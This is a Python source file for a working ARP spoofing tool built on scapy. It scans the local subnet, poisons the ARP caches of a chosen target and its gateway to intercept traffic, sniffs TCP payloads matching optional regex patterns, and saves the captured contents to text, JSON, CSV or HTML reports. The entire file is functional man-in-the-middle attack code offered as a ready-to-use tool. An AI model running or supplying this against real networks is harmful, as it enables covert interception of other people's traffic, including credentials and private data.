import scapy.all as scapy
import time
import threading
import datetime
import json
import netifaces
import re
import csv
import warnings

from pathlib import Path
from scapy.layers.l2 import ARP, Ether
from scapy.layers.inet import IP, TCP
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.prompt import Prompt
from rich.panel import Panel
from src.network.network_utils import get_hostname, display_devices
from src.utils.logger import setup_logger
from src.core.exceptions import NetworkException
from src.models.models import PacketInfo, Device
from src.utils.validators import validate_ip
from jinja2 import Environment, FileSystemLoader, select_autoescape

warnings.filterwarnings("ignore")

"""
ARP Spoofer module for network packet manipulation and analysis.

This module provides the core functionality for ARP spoofing operations,
including packet capture, pattern matching, and network device scanning.
"""

class ARPSpoofer:
    """
    Main class for performing ARP spoofing operations.

    Attributes:
        target_ip (str): Target device IP address
        gateway_ip (str): Network gateway IP address
        patterns (list): List of patterns to match in captured packets
        is_spoofing (bool): Flag indicating if spoofing is active
        captured_packets (list): List of captured network packets

    Examples:
        >>> spoofer = ARPSpoofer(target_ip="192.168.1.10")
        >>> spoofer.run()
    """
    
    def __init__(self, target_ip: str = None, gateway_ip: str = None, patterns: list = None):
        """
        Initialize the ARPSpoofer instance.

        Args:
            target_ip (str): Target device IP address
            gateway_ip (str): Network gateway IP address
            patterns (list): List of patterns to match in captured packets
        """
        self.console = Console()
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.patterns = patterns or []
        self.is_spoofing = False
        self.captured_packets = []
        self.output_dir = Path("captured_data")
        self.output_dir.mkdir(exist_ok=True)

        self.logger = setup_logger("arp_spoofer", self.console)

    def scan_network(self, ip_range: str) -> list:
        """
        Scan network for active devices.

        Args:
            ip_range (str): IP range to scan (e.g., "192.168.1.0/24")

        Returns:
            list: List of Device objects representing discovered devices

        Raises:
            NetworkException: If scanning fails
        """
        self.console.print("[bold blue]Scanning network...[/]")
        arp_request = ARP(pdst=ip_range)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        devices = []
        for element in answered_list:
            device = Device(
                ip=element[1].psrc,
                mac=element[1].hwsrc,
                hostname=get_hostname(element[1].psrc),
            )
            devices.append(device)
        return devices

    def packet_callback(self, packet):
        """Packet callback with pattern matching."""
        if self.is_spoofing and packet.haslayer(TCP):
            if packet.haslayer(scapy.Raw):
                payload = packet[scapy.Raw].load.decode("utf-8", errors="ignore")

                # Check if payload matches any pattern
                if not self.patterns or any(re.search(pattern, payload) for pattern in self.patterns):
                    packet_time = datetime.datetime.fromtimestamp(packet.time).strftime('%Y-%m-%d %H:%M:%S')
                    packet_info = PacketInfo(
                        time=packet_time,
                        src=packet[IP].src,
                        dst=packet[IP].dst,
                        payload=payload,
                    )
                    self.captured_packets.append(packet_info)
                    # Log every captured packet
                    self.logger.info(f"Captured packet from {packet[IP].src} to {packet[IP].dst} at {packet_info.time}")

    def save_captured_data(self, format: str = "txt"):
        """Save captured packets to file."""
        filename_timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = self.output_dir / f"capture_{filename_timestamp}.{format}"
        
        display_timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        if format == "txt":
            with open(filename, "w") as f:
                f.write(f"ARP Spoofing Session Report\n")
                f.write(f"{'-'*50}\n")
                f.write(f"Timestamp: {display_timestamp}\n")
                f.write(f"Target IP: {self.target_ip}\n")
                f.write(f"Gateway IP: {self.gateway_ip}\n")
                f.write(f"Patterns: {', '.join(self.patterns) if self.patterns else 'None'}\n")
                f.write(f"{'-'*50}\n\n")
                f.write("Captured Packets:\n")
                f.write(f"{'='*50}\n")
                for packet in self.captured_packets:
                    f.write(f"Time        : {packet.time}\n")
                    f.write(f"Source      : {packet.src} ({get_hostname(packet.src)})\n")
                    f.write(f"Destination : {packet.dst} ({get_hostname(packet.dst)})\n")
                    f.write(f"Payload     : {packet.payload}\n")
                    f.write(f"{'-'*50}\n")
                f.write(f"\nSummary:\n")
                f.write(f"{'-'*50}\n")
                f.write(f"Total Captured Packets      : {len(self.captured_packets)}\n")
                unique_sources = len(set(packet.src for packet in self.captured_packets))
                unique_destinations = len(set(packet.dst for packet in self.captured_packets))
                f.write(f"Unique Source IPs          : {unique_sources}\n")
                f.write(f"Unique Destination IPs     : {unique_destinations}\n")

        elif format == "json":
            data = {
                "session": display_timestamp,
                "target_ip": self.target_ip,
                "gateway_ip": self.gateway_ip,
                "patterns": self.patterns,
                "packets": [packet.to_dict() for packet in self.captured_packets],
            }

            with open(filename, "w") as f:
                json.dump(data, f, indent=4)

        elif format == "csv":
            with open(filename, "w", newline='') as csvfile:
                fieldnames = ['Time', 'Source IP', 'Source Hostname', 'Destination IP', 'Destination Hostname', 'Payload']
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)

                writer.writeheader()
                for packet in self.captured_packets:
                    writer.writerow({
                        'Time': packet.time,
                        'Source IP': packet.src,
                        'Source Hostname': get_hostname(packet.src),
                        'Destination IP': packet.dst,
                        'Destination Hostname': get_hostname(packet.dst),
                        'Payload': packet.payload
                    })

        elif format == "html":
            env = Environment(
                loader=FileSystemLoader('src/utils'),
                autoescape=select_autoescape(['html', 'xml'])
            )
            template = env.get_template('report_template.html')

            # Enhance packet data with hostname resolution
            enhanced_packets = []
            for packet in self.captured_packets:
                enhanced_packets.append({
                    'time': packet.time,
                    'src': packet.src,
                    'src_hostname': get_hostname(packet.src),
                    'dst': packet.dst,
                    'dst_hostname': get_hostname(packet.dst),
                    'payload': packet.payload,
                })

            unique_sources = len(set(packet['src'] for packet in enhanced_packets))
            unique_destinations = len(set(packet['dst'] for packet in enhanced_packets))

            html_content = template.render(
                timestamp=display_timestamp,
                target_ip=self.target_ip,
                gateway_ip=self.gateway_ip,
                patterns=', '.join(self.patterns) if self.patterns else 'None',
                total_packets=len(self.captured_packets),
                unique_sources=unique_sources,
                unique_destinations=unique_destinations,
                packets=enhanced_packets
            )

            with open(filename, "w") as f:
                f.write(html_content)

        else:
            self.logger.error(f"Unsupported format: {format}")
            return

        self.logger.info(f"Saved captured data to {filename}")

    def spoof(self, target_ip: str, spoof_ip: str):
        """
        Send ARP spoofing packets.

        Args:
            target_ip (str): Target device IP address
            spoof_ip (str): IP address to spoof

        Raises:
            NetworkException: If spoofing fails
        """
        target_mac = self.get_mac(target_ip)
        packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.sendp(packet, verbose=False)

    def restore(self, destination_ip: str, source_ip: str):
        """
        Restore ARP tables.

        Args:
            destination_ip (str): Destination device IP address
            source_ip (str): Source device IP address
        """
        try:
            destination_mac = self.get_mac(destination_ip)
            source_mac = self.get_mac(source_ip)
            packet = Ether(dst=destination_mac) / ARP(
                op=2,
                pdst=destination_ip,
                hwdst=destination_mac,
                psrc=source_ip,
                hwsrc=source_mac,
            )
            scapy.sendp(packet, count=4, verbose=False)
            self.logger.info(f"Restored ARP table on {destination_ip}")
        except Exception as e:
            self.logger.error(f"Error restoring ARP table: {str(e)}")

    def get_mac(self, ip: str) -> str:
        """
        Get MAC address for IP with better error handling.

        Args:
            ip (str): IP address to resolve

        Returns:
            str: MAC address

        Raises:
            NetworkException: If MAC address resolution fails
        """
        try:
            if not validate_ip(ip):
                raise NetworkException(f"Invalid IP address: {ip}")

            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request

            for _ in range(3):  # Retry 3 times
                answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]
                if answered_list:
                    return answered_list[0][1].hwsrc
                time.sleep(1)

            self.logger.error(f"Host {ip} is not responding to ARP requests")
            raise NetworkException(f"Host {ip} is not responding to ARP requests")

        except NetworkException as e:
            self.logger.error(str(e))
            raise
        except Exception as e:
            self.logger.error(f"Error getting MAC address: {str(e)}")
            raise NetworkException(f"Error getting MAC address: {str(e)}") from e

    def run(self, format: str = None):
        """
        Main execution method.

        Args:
            format (str): Output format for captured data (txt, json, html, csv)
        """
        try:
            if not self.target_ip:
                gws = netifaces.gateways()
                if "default" not in gws or netifaces.AF_INET not in gws["default"]:
                    self.logger.error("No default gateway found. Please specify it manually.")
                    return

                self.gateway_ip = self.gateway_ip or gws["default"][netifaces.AF_INET][0]
                network = f"{self.gateway_ip}/24"

                devices = self.scan_network(network)
                display_devices(self.console, devices)
                self.target_ip = Prompt.ask("Enter target IP", default=devices[0].ip)

            if not validate_ip(self.target_ip) or not validate_ip(self.gateway_ip):
                self.logger.error("Invalid target or gateway IP address.")
                return

            self.logger.info("Starting ARP spoofing attack:")
            self.logger.info(f"Target IP: {self.target_ip}")
            self.logger.info(f"Gateway IP: {self.gateway_ip}")
            if self.patterns:
                self.logger.info(f"Monitoring patterns: {self.patterns}")

            # Start packet capture in a separate thread
            capture_thread = threading.Thread(
                target=lambda: scapy.sniff(prn=self.packet_callback, store=False)
            )
            capture_thread.daemon = True
            capture_thread.start()

            self.is_spoofing = True
            
            # Use dots spinner instead of None
            with self.console.status("[cyan]Spoofing in progress...", spinner="dots") as status:
                try:
                    while self.is_spoofing:
                        self.spoof(self.target_ip, self.gateway_ip)
                        self.spoof(self.gateway_ip, self.target_ip)
                        time.sleep(1)
                except KeyboardInterrupt:
                    raise

        except NetworkException as e:
            self.logger.error(str(e))
        except KeyboardInterrupt:
            self.logger.info("\nStopping ARP spoofer...")
            self.is_spoofing = False
            self.restore(self.target_ip, self.gateway_ip)
            self.restore(self.gateway_ip, self.target_ip)

            if self.captured_packets:
                self.console.print(Panel.fit(f"[bold green]Captured {len(self.captured_packets)} packets[/]"))
                
                if format:
                    # If format is specified via command line, save directly
                    self.save_captured_data(format=format)
                else:
                    # Prompt the user for the desired format
                    save = Prompt.ask("Save captured data?", choices=["txt", "json", "html", "csv", "no"], default="html")
                    if save != "no":
                        self.save_captured_data(format=save)